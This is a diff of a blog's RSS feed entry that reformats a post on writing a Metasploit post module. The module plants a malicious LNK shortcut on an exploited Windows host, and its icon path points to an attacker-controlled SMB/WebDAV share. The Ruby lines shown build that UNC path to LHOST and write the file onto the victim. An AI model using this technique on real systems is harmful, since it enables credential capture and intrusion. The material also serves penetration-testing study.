@@ -16,66 +16,37 @@
       <pubDate>Sun, 19 Feb 2012 05:57:02 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</guid>
-      <description>&lt;p&gt;I have been using the LNK trick I talked about in my &lt;a href=&#34;https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018&#34;&gt;last post&lt;/a&gt; for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target.&lt;/p&gt;
-
-&lt;p&gt;Of course the first place I looked was Meterpreter&amp;rsquo;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa969393.aspx&#34;&gt;work with COM objects&lt;/a&gt;. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx&#34;&gt;using the spec&lt;/a&gt;.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz&lt;/p&gt;
-
+      <description>&lt;p&gt;I have been using the LNK trick I talked about in my &lt;a href=&#34;https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018&#34;&gt;last post&lt;/a&gt; for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&#39;s target.&lt;/p&gt;
+&lt;p&gt;Of course the first place I looked was Meterpreter&#39;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa969393.aspx&#34;&gt;work with COM objects&lt;/a&gt;. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx&#34;&gt;using the spec&lt;/a&gt;.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz&lt;/p&gt;
 &lt;p&gt;Enter &lt;a href=&#34;http://redmine.corelan.be/projects/mona&#34;&gt;mona&lt;/a&gt;, the &lt;a href=&#34;http://www.corelan.be/&#34;&gt;Corelan Team’s&lt;/a&gt; exploit development plugin for &lt;a href=&#34;http://immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.&lt;/p&gt;
-
 &lt;p&gt;We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued:&lt;/p&gt;
-
 &lt;p&gt;&lt;code&gt;“!mona header C:\autoexec.lnk”&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;header &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;C:\%\\\\192.168.100.100\\w00t\\bogusimage.png`&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;header &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_unicode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;C:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;192.168.100.100&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w00t&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bogusimage.png`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.&lt;/p&gt;
 &lt;p&gt;Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?&lt;/p&gt;
-
 &lt;p&gt;Now I have 3 challenges:&lt;/p&gt;
-
 &lt;ol&gt;
 &lt;li&gt;It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.&lt;/li&gt;
 &lt;li&gt;It needs to upload the file to the exploited system.&lt;/li&gt;
 &lt;li&gt;It needs to be up to code on the Metasploit coding standards&lt;/li&gt;
 &lt;/ol&gt;
-
 &lt;p&gt;Changing the line I found for the share name into this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;lnk &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;\\\\#{datastore[&#39;LHOST&#39;]}\\#{datastore[&#39;SHARENAME&#39;]}\\#{datastore[&#39;ICONFILENAME&#39;]}`&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;OptAddressRange.new(&amp;quot;LHOST&amp;quot;, [ true, &amp;quot;Host listening for incoming SMB/WebDAV traffic&amp;quot;, nil]),
-OptString.new(&amp;quot;SHARENAME&amp;quot;, [ true, &amp;quot;Share name on LHOST&amp;quot;, &amp;quot;share1&amp;quot;]),       
-OptString.new(&amp;quot;ICONFILENAME&amp;quot;, [ true, &amp;quot;File name on LHOST&#39;s share&amp;quot;, &amp;quot;icon.png&amp;quot;])
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;lnk &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_unicode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LHOST&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SHARENAME&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ICONFILENAME&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;OptAddressRange&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LHOST&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host listening for incoming SMB/WebDAV traffic&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;),
+&lt;span style=&#34;color:#66d9ef&#34;&gt;OptString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SHARENAME&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Share name on LHOST&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;share1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;),       
+&lt;span style=&#34;color:#66d9ef&#34;&gt;OptString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ICONFILENAME&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;File name on LHOST&amp;#39;s share&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;icon.png&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.&lt;/p&gt;
 &lt;p&gt;Problem 1 solved. Problem 2 was just as easy, the following line:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;file = client.fs.file.new(datastore[&#39;LNKFILENAME&#39;], &#39;wb&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.&lt;/p&gt;
 &lt;p&gt;Problem 3 is much more tricky, but here is the path to wisdom:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Hope this helps spur people into trying their hand at developing some modules of their own.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hope this helps spur people into trying their hand at developing some modules of their own.&lt;/p&gt;
 </description>
     </item>
     
